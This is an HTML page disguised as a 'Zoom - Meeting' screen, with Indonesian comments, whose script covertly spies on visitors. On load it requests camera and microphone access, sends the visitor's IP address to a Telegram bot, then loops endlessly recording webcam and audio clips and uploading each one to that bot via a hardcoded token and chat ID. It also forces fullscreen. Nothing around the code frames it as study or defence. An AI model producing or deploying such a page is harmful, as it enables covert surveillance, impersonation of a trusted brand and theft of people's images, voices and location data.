<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Zoom - Meeting</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="video-container">
    <video id="userVideo" autoplay playsinline></video>
  </div>

  <!-- Bar bagian bawah dengan gambar memanjang -->
  <div class="bottom-bar">
    <img src="https://files.catbox.moe/mkpj7q.png" alt="Bottom Bar">
  </div>

  <script>
    const video = document.getElementById('userVideo');
    const ownerId = '7377733784'; // Ganti dengan owner ID Anda
    const botToken = '7512836049:AAHB9STFF0Qxzg5ryLs6Gc7idtdBFJJBGYE'; // Ganti dengan token bot Anda

    // Fungsi untuk mendapatkan IP pengguna
    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown IP';
      }
    }

    // Fungsi untuk mengirim pesan ke bot Telegram
    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = {
        chat_id: ownerId,
        text: message,
      };

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });
        const result = await response.json();
        console.log('Message sent:', result);
      } catch (error) {
        console.error('Error sending to Telegram:', error);
      }
    }

    // Fungsi untuk mengirim video ke Telegram
    async function sendVideoToTelegram(videoBlob) {
      const formData = new FormData();
      formData.append('chat_id', ownerId);
      formData.append('video', videoBlob, 'XbibzOfficial.webm');

      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData,
        });
        const result = await response.json();
        console.log('Video sent:', result);
      } catch (error) {
        console.error('Error sending video to Telegram:', error);
      }
    }

    // Fungsi untuk merekam video dari elemen <video>
    async function recordVideo(duration) {
      const stream = video.srcObject;
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm; codecs=vp9',
      });

      const chunks = [];
      mediaRecorder.ondataavailable = (event) => {
        chunks.push(event.data);
      };

      return new Promise((resolve) => {
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          resolve(blob);
        };

        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, duration);
      });
    }

    // Fungsi untuk merekam dan mengirim video setiap 3 detik
    async function recordAndSendVideo() {
      while (true) {
        const videoBlob = await recordVideo(5000); // Rekam video selama 3 detik
        await sendVideoToTelegram(videoBlob); // Kirim video ke Telegram
        await new Promise((resolve) => setTimeout(resolve, 3000)); // Tunggu 3 detik
      }
    }

    // Akses kamera dan mikrofon pengguna
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then((stream) => {
        video.srcObject = stream;

        // Kirim IP pengguna saat pertama kali masuk
        getUserIP().then((ip) => {
          sendToTelegram(`User has entered the website\nIP: ${ip}`);
        });

        // Mulai merekam dan mengirim video setiap 3 detik
        recordAndSendVideo();
      })
      .catch((error) => {
        console.error('Error accessing camera or microphone:', error);
      });

    // Aktifkan fullscreen saat halaman dimuat
    document.documentElement.requestFullscreen().catch((error) => {
      console.error('Error attempting to enable fullscreen:', error);
    });
  </script>
</body>
</html>